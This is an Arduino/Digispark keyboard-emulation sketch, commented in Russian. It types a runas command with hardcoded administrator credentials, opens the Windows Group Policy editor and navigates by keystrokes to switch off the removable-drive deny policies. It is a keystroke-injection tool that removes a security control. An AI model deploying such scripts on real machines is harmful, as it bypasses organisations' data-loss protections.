#include "DigiKeyboard.h" // Подключение библиотеки эмуляции клавиатуры

/*
 * Определение/переопределение кодов клавиш
 */
#define KEY_TAB            0x2B // Код клавиши TAB
#define KEY_ARROW_RIGHT    0x4F // Код клавиши вправо
#define KEY_ARROW_LEFT     0x50 // Код клавиши влево
#define KEY_ARROW_DOWN     0x51 // Код клавиши вниз
#define KEY_ARROW_UP       0x52 // Код клавиши вверх

/*
 * Логин и пароль пользователя с правами администратора
 */
String user = "User"; // Логин администратора
String password = "1234567890"; // Пароль администратора

void setup() {
  /*
   * Смена раскладки клавиатуры на РУС, а затем на ENG
   * Чтобы достоверно убедиться, что установлена именно ENG раскладка, делаем следующее:
   * 1. Правыми Alt+Shift меняем раскладку на РУС (если уже РУС, то не изменится)
   * 2. Левыми Alt+Shift меняем раскладку на ENG (всегда меняет раскладку на другую)
   */
  DigiKeyboard.sendKeyStroke(0, MOD_SHIFT_RIGHT | MOD_ALT_RIGHT); // Посылаем сочетание правых клавиш Alt+Shift
  DigiKeyboard.delay(300); // Задержка 300 мс
  DigiKeyboard.sendKeyStroke(0, MOD_SHIFT_LEFT | MOD_ALT_LEFT); // Посылаем сочетание левых клавиш Alt+Shift
  DigiKeyboard.delay(300); // Задержка 300 мс
  
  /*
   * Запуск командной строки Windows
   * 1. Сочетанием клавиш Win+R вызываем окно "Выполнить"
   * 2. Вводим в поле "cmd" и нажимаем "Enter"
   * Командная строка запускается от имени текущего пользователя
   */
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Посылаем сочетание клавиш Win+R
  DigiKeyboard.delay(300); // Задержка 300 мс
  DigiKeyboard.println("cmd"); // Вводим "cmd" и переводим строку (аналогично нажатию "Enter")
  DigiKeyboard.delay(1000); // Задержка 1 сек (ждем, пока запустится командная строка)
  
  /*
   * Запуск редактора локальной групповой политики с правами администратора
   * 1. Вводим в командной строке команду "runas /user:"Имя_пользователя" "mmc %windir%\system32\gpedit.msc
   * 2. Вводим пароль администратора для "Имя_пользователя" и переводим строку (аналогично нажатию "Enter")
   */
  DigiKeyboard.print("runas /user:\""); // Вводим первую часть команды
  DigiKeyboard.print(user); // Вводим логин пользователя с правами администратора
  DigiKeyboard.println("\" \"mmc %windir%\\system32\\gpedit.msc\""); // Вводим вторую часть команды и переводим строку (аналогично нажатию "Enter")
  DigiKeyboard.delay(300); // Задержка 300 мс
  DigiKeyboard.println(password); // Вводим пароль пользователя с правами администратора

  /*
   * Ожидание открытия редактора локальных групповых политик
   */
  DigiKeyboard.delay(2000); // Задержка 2 сек (ждем, пока запустится редактор политик)

  /*
   * Переход по дереву локальных групповых политик к политике доступа к внешним съемным дискам
   */
  for (int i = 0; i < 8; i++) { // Выполяем в цикле 8 раз
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN); // Нажимаем клавишу вниз
    DigiKeyboard.delay(300); // Задержка 300 мс
  }
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT); // Нажимаем клавишу право
  DigiKeyboard.delay(300); // Задержка 300 мс
  for (int i = 0; i < 7; i++) { // Выполняем в цикле 7 раз
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN); // Нажимаем клавишу вниз
    DigiKeyboard.delay(300); // Задержка 300 мс
  }
  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT); // Нажимаем клавишу вправо
  DigiKeyboard.delay(300); // Задержка 300 мс
  for (int i = 0; i < 5; i++) { // Выполняем в цикле 5 раз
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN); // Нажимаем клавишу вниз
    DigiKeyboard.delay(300); // Задержка 300 мс
  }
  DigiKeyboard.sendKeyStroke(KEY_TAB); // Нажимаем клавишу Tab
  DigiKeyboard.delay(300); // Задержка 300 мс

  /*
   * Изменяем значения параметров доступа к съемным дискам
   * (отключаем запрет на чтение, запись и доступ)
   */
  for (int i = 0; i < 7; i++) { // Выполняем в цикле 7 раз
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN); // Нажимаем клавишу вниз
    DigiKeyboard.delay(300); // Задержка 300 мс
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем клавишу Enter
  DigiKeyboard.delay(300); // Задержка 300 мс
  for (int i = 0; i < 2; i++) { // Выполняем в цикле 2 раза
    DigiKeyboard.sendKeyStroke(KEY_TAB); // Нажимаем клавишу Tab
    DigiKeyboard.delay(300); // Задержка 300 мс
  }
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN); // Нажимаем клавишу вниз
  DigiKeyboard.delay(300); // Задержка 300 мс
  for (int i = 0; i < 8; i++) { // Выполяем в цикле 8 раз
    DigiKeyboard.sendKeyStroke(KEY_TAB); // Нажимаем клавишу Tab
    DigiKeyboard.delay(300); // Задержка 300 мс
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем клавишу Enter
  DigiKeyboard.delay(300); // Задержка 300 мс
  DigiKeyboard.sendKeyStroke(KEY_TAB); // Нажимаем клавишу Tab
  DigiKeyboard.delay(300); // Задержка 300 мс
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN); // Нажимаем клавишу вниз
  DigiKeyboard.delay(300); // Задержка 300 мс
  for (int i = 0; i < 8; i++) { // Выполняем в цикле 8 раз
    DigiKeyboard.sendKeyStroke(KEY_TAB); // Нажимаем клавишу Tab
    DigiKeyboard.delay(300); // Задержка 300 мс
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем клавишу Enter
  DigiKeyboard.delay(300); // Задержка 300 мс
  DigiKeyboard.sendKeyStroke(KEY_TAB); // Нажимаем клавишу Tab
  DigiKeyboard.delay(300); // Задержка 300 мс
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN); // Нажимаем клавишу вниз
  DigiKeyboard.delay(300); // Задержка 300 мс
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем клавишу Enter
  DigiKeyboard.delay(300); // Задержка 300 мс

  
  /*
   * Закрываем редактор локальных групповых политик
   */
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // Посылаем сочетание клавиш Alt+F4
  DigiKeyboard.delay(300); // Задержка 300 мс

  /*
   * Закрываем ранее открытую командную строку
   */
  DigiKeyboard.print("exit"); // Печатаем в командной строке команду "exit"
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем клавишу Enter
}

void loop() {
  /*
   * Сигнализируем о готовности миганием светодиода
   */
  digitalWrite(1, !digitalRead(1)); // Меняем в каждой итерации значение цифрового выхода на противоположное
  delay(100); // Задержка 100 мс
}
